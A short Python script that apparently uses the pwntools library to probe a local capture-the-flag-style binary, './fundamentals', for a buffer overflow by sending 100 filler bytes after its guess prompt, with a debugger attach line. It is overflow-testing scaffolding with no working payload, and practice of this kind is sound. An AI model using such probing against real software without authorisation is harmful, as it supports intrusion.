from pwn import *
payload = b'a'*100
s = process("./fundamentals")
print(s.recvuntil("What is your guess?\n"))
s.sendline(payload)
s.interactive()
gdb.attach(s, gdbscript='continue')